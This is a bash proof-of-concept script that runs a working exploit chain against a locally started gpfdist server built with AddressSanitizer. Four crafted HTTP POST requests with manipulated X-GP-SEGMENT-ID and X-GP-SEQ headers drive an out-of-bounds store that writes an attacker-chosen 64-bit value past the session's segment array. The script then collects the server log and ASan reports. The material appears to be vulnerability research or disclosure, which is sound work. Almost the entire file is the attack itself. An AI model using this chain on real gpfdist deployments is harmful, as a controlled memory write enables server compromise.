#!/usr/bin/env bash
# Live chosen-value chain against the REAL pinned gpfdist.c on 127.0.0.1.
# Same named session throughout; the create request marks segid 0 active so
# the session survives the OOB active_segids[3] write (maxsegs stays 1).
#   req1 id=0 seq=1   -> in-bounds session setup
#   req2 id=3 seq=1   -> OOB store writes 1 into seq_segs[3] (path[0..7])
#   req3 id=3 seq=2   -> equality check passes, OOB store writes 2
#   req4 id=3 seq=T   -> equality check passes, OOB store writes T (chosen)
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
BIN=${1:-$HERE/gpfdist_v761_asan}
PORT=${2:-18094}
TARGET=${3:-4702111234474983745}
OUT="$HERE/out_chosen_$(basename "$BIN")"; rm -rf "$OUT"; mkdir -p "$OUT/data"
printf 'row1\n' > "$OUT/data/out.txt"
: > "$OUT/server.log"
export ASAN_OPTIONS='detect_leaks=0:abort_on_error=0'
"$BIN" -b 127.0.0.1 -p "$PORT" -d "$OUT/data" -l "$OUT/server.log" >"$OUT/stdout" 2>&1 &
PID=$!
for i in $(seq 1 50); do (echo >"/dev/tcp/127.0.0.1/$PORT") >/dev/null 2>&1 && break; sleep 0.1; done
if ! kill -0 "$PID" 2>/dev/null; then echo SERVER_FAILED; sed -n 1,20p "$OUT/stdout"; exit 2; fi
S="http://127.0.0.1:$PORT/out.txt"
H=(-H 'X-GP-PROTO:1' -H 'X-GP-XID:99' -H 'X-GP-CID:1' -H 'X-GP-SN:1' -H 'X-GP-SEGMENT-COUNT:1')
req() { local n="$1" id="$2" sq="$3"; local c; c=$(curl -sS -m 5 -o "$OUT/r${n}.body" -w '%{http_code}' -X POST "$S" "${H[@]}" -H "X-GP-SEGMENT-ID:$id" -H "X-GP-SEQ:$sq" 2>"$OUT/r${n}.err"); echo "req$n id=$id seq=$sq http=$c rc=$?"; }
req 1 0 1
req 2 3 1
req 3 3 2
req 4 3 "$TARGET"
kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null
echo '--- key log lines ---'
grep -E 'new session|joined session|out of order|free session|HTTP ERROR' "$OUT/server.log" | sed -n 1,30p
echo "--- asan files ---"; ls "$OUT"/asan* 2>/dev/null | sed -n 1,5p
